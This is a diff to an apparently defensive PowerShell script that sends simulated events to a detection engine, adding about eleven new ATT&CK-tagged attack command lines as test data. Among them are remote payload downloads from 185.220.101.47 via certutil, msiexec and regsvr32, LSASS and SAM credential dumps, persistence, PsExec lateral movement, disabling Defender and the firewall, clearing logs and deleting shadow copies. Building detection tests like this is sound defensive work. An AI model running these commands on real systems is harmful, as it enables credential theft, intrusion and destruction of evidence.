@@ -19,8 +19,9 @@
 # pipeline. The engine is left running afterwards - open sf-console
 # to watch the alerts, or stop it with 'sf-console -Stop'.
 #
-# Expected result: 7 alerts (3 critical + 4 high) from 11 events
-# (4 benign + 7 offensive). Works on PowerShell 5.1+.
+# Expected result: 18 alerts (8 critical + 10 high) from 19 events
+# (4 benign + 15 offensive), plus the 3 kill-chain sequences the
+# engine correlates from them. Works on PowerShell 5.1+.
 # ======================================================================
 param(
     [string]$Addr = '127.0.0.1:7777',
@@ -69,14 +70,30 @@ $scenario = @(
     (New-SimEvent 'process.create' @{ pid = 6612; ppid = 4104; name = 'powershell.exe'; command_line = 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'; image = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' } $null -Offensive),
     # T1105 - certutil download (offensive)
     (New-SimEvent 'process.create' @{ pid = 6688; ppid = 4104; name = 'certutil.exe'; command_line = 'certutil.exe -urlcache -split -f https://185.220.101.47/payload.exe C:\Users\Public\payload.exe'; image = 'C:\Windows\System32\certutil.exe' } $null -Offensive),
+    # T1218.005 - remote MSI installation (offensive)
+    (New-SimEvent 'process.create' @{ pid = 6801; ppid = 6612; name = 'msiexec.exe'; command_line = 'msiexec.exe /q /i http://185.220.101.47/payload.msi'; image = 'C:\Windows\System32\msiexec.exe' } $null -Offensive),
     # T1003.001 - LSASS dump via comsvcs.dll (offensive)
     (New-SimEvent 'process.create' @{ pid = 6721; ppid = 6612; name = 'rundll32.exe'; command_line = 'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 744 C:\Windows\Temp\lsass.dmp full'; image = 'C:\Windows\System32\rundll32.exe' } $null -Offensive),
+    # T1003.001 - LSASS dump via signed procdump (offensive)
+    (New-SimEvent 'process.create' @{ pid = 6845; ppid = 6612; name = 'procdump.exe'; command_line = 'procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass2.dmp'; image = 'C:\Windows\System32\procdump.exe' } $null -Offensive),
+    # T1003.002 - SAM hive dump (offensive)
+    (New-SimEvent 'process.create' @{ pid = 6834; ppid = 6612; name = 'reg.exe'; command_line = 'reg.exe save HKLM\SAM C:\Users\Public\sam.hiv'; image = 'C:\Windows\System32\reg.exe' } $null -Offensive),
     # T1053.005 - scheduled task persistence (offensive)
     (New-SimEvent 'process.create' @{ pid = 6733; ppid = 6612; name = 'schtasks.exe'; command_line = 'schtasks.exe /create /tn "MicrosoftEdgeUpdaterCore" /sc onlogon /ru SYSTEM /tr "C:\Users\Public\payload.exe"'; image = 'C:\Windows\System32\schtasks.exe' } $null -Offensive),
+    # T1547.001 - Run key persistence (offensive)
+    (New-SimEvent 'process.create' @{ pid = 6777; ppid = 6612; name = 'reg.exe'; command_line = 'reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveSync /t REG_SZ /d C:\Users\Public\payload.exe /f'; image = 'C:\Windows\System32\reg.exe' } $null -Offensive),
     # T1047 - WMI process execution (offensive)
     (New-SimEvent 'process.create' @{ pid = 6744; ppid = 6612; name = 'wmic.exe'; command_line = 'wmic.exe /node:LAB-WKS-02 process call create "cmd.exe /c C:\Users\Public\payload.exe"'; image = 'C:\Windows\System32\wbem\WMIC.exe' } $null -Offensive),
+    # T1021.002 - lateral movement with PsExec (offensive)
+    (New-SimEvent 'process.create' @{ pid = 6856; ppid = 6612; name = 'psexec.exe'; command_line = 'psexec.exe \\LAB-WKS-02 -accepteula -c C:\Users\Public\payload.exe'; image = 'C:\Windows\System32\psexec.exe' } $null -Offensive),
     # T1562.001 - Defender tampering (offensive)
     (New-SimEvent 'process.create' @{ pid = 6755; ppid = 6612; name = 'powershell.exe'; command_line = 'powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true'; image = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' } $null -Offensive),
+    # T1562.004 - firewall impairment (offensive)
+    (New-SimEvent 'process.create' @{ pid = 6812; ppid = 6612; name = 'netsh.exe'; command_line = 'netsh.exe advfirewall set allprofiles state off'; image = 'C:\Windows\System32\netsh.exe' } $null -Offensive),
+    # T1070.001 - clear event logs (offensive)
+    (New-SimEvent 'process.create' @{ pid = 6823; ppid = 6612; name = 'wevtutil.exe'; command_line = 'wevtutil.exe cl Security'; image = 'C:\Windows\System32\wevtutil.exe' } $null -Offensive),
+    # T1218.010 - regsvr32 scriptlet execution (offensive)
+    (New-SimEvent 'process.create' @{ pid = 6790; ppid = 6612; name = 'regsvr32.exe'; command_line = 'regsvr32.exe /u /i:http://185.220.101.47/scrobj.dll scrobj'; image = 'C:\Windows\System32\regsvr32.exe' } $null -Offensive),
     # T1490 - inhibit recovery, VSS deletion (offensive)
     (New-SimEvent 'process.create' @{ pid = 6766; ppid = 6612; name = 'vssadmin.exe'; command_line = 'vssadmin.exe delete shadows /all /quiet'; image = 'C:\Windows\System32\vssadmin.exe' } $null -Offensive),
     # benign tail
